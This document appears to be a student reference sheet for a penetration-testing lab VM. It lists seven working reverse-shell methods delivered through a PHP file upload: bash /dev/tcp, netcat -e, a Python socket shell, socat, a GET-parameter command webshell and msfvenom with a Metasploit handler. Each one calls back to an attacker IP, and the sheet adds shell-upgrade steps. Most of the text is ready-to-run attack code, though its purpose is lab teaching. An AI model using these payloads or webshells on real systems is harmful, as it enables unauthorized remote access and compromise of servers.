# Reverse Shell Methods - Student Reference

This VM is configured to support ALL common reverse shell methods.

## Quick Start

1. **Start listener on your attacking machine:**
   ```bash
   nc -lvnp 4444
   ```

2. **Upload your shell via the web interface**

3. **Trigger it:**
   ```
   http://192.168.56.21/uploads/yourshell.php
   ```

---

## Method 1: PentestMonkey PHP Reverse Shell (Recommended)

**File:** `/usr/share/webshells/php/php-reverse-shell.php` (on Kali)

**Steps:**
1. Copy the file to your working directory
2. Edit lines 49-50:
   ```php
   $ip = '192.168.56.10';  // Your Kali IP
   $port = 4444;           // Your listener port
   ```
3. Upload via web interface
4. Visit the uploaded file URL

**Why it works:** Uses `proc_open()` for full bidirectional shell

---

## Method 2: Simple Bash Reverse Shell

**Create file:** `bash-shell.php`
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'");
?>
```

**Why it works:** Uses Bash's built-in `/dev/tcp` feature

---

## Method 3: Netcat Reverse Shell

**Create file:** `nc-shell.php`
```php
<?php
system("nc -e /bin/bash 192.168.56.10 4444");
?>
```

**Why it works:** Uses traditional netcat with `-e` flag

---

## Method 4: Python Reverse Shell

**Create file:** `python-shell.php`
```php
<?php
$cmd = "python3 -c 'import socket,subprocess,os;";
$cmd .= "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);";
$cmd .= "s.connect((\"192.168.56.10\",4444));";
$cmd .= "os.dup2(s.fileno(),0);";
$cmd .= "os.dup2(s.fileno(),1);";
$cmd .= "os.dup2(s.fileno(),2);";
$cmd .= "subprocess.call([\"/bin/bash\",\"-i\"]);'";
system($cmd);
?>
```

**Why it works:** Uses Python's socket library

---

## Method 5: Socat Reverse Shell

**Create file:** `socat-shell.php`
```php
<?php
system("socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.56.10:4444");
?>
```

**Why it works:** Socat provides a stable encrypted channel

---

## Method 6: Simple Command Webshell (Then Manual Reverse Shell)

**Create file:** `cmd.php`
```php
<?php
system($_GET['cmd']);
?>
```

**Usage:**
1. Upload `cmd.php`
2. Visit: `http://192.168.56.21/uploads/cmd.php?cmd=whoami`
3. Manually spawn reverse shell:
   ```
   http://192.168.56.21/uploads/cmd.php?cmd=bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'
   ```

---

## Method 7: MSFVenom PHP Shell

**Generate payload:**
```bash
msfvenom -p php/reverse_php LHOST=192.168.56.10 LPORT=4444 -f raw > msf-shell.php
```

**Start handler:**
```bash
msfconsole -q
use exploit/multi/handler
set payload php/reverse_php
set LHOST 192.168.56.10
set LPORT 4444
exploit
```

**Upload and trigger:** Visit the uploaded file

---

## Troubleshooting

### Shell connects but dies immediately
- Check firewall on Kali: `sudo ufw status`
- Use stable listener: `rlwrap nc -lvnp 4444`

### No connection at all
- Verify listener is running
- Check IP is correct (192.168.56.10 for Kali, NOT .21)
- Check port matches (4444 in both shell and listener)

### "Connection refused"
- Listener not running
- Wrong port number
- Start listener BEFORE visiting shell URL

### PHP source code displayed
- PHP not executing - contact instructor
- Should not happen on this VM

### "Cannot execute binary file"
- Wrong architecture (x86 vs ARM)
- Use scripts (PHP, Bash, Python) not compiled binaries

---

## Upgrading Your Shell

Once you get a basic shell, upgrade it:

### Python PTY Upgrade
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### Script Upgrade
```bash
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Common Mistakes

❌ **Wrong:** Using VM's IP (192.168.56.21)
✅ **Correct:** Using Kali's IP (192.168.56.10)

❌ **Wrong:** Listener on different port than shell
✅ **Correct:** Both use same port (e.g., 4444)

❌ **Wrong:** Triggering shell before starting listener
✅ **Correct:** Start listener first, then trigger shell

❌ **Wrong:** Using Windows line endings in shell script
✅ **Correct:** Use Unix line endings (LF, not CRLF)

---

## Available Tools on Target

The VM has these tools installed:
- ✓ bash
- ✓ nc (netcat traditional)
- ✓ socat
- ✓ python3
- ✓ perl
- ✓ PHP (all functions enabled)

---

## Shell Cheat Sheet

**Start listener:**
```bash
nc -lvnp 4444
```

**Upgrade shell:**
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

**Background shell:**
```bash
Ctrl+Z
```

**Return to shell:**
```bash
fg
```

**Check your IP:**
```bash
ip addr show eth1
```

**Find uploaded files:**
```bash
ls -la /var/www/html/uploads/
```

---

## Resources

- **PentestMonkey Reverse Shells:** http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- **Kali Webshells:** `/usr/share/webshells/`
- **RevShells Generator:** https://www.revshells.com/

---

Remember: The goal is to get initial access (www-data shell), then escalate privileges to root!
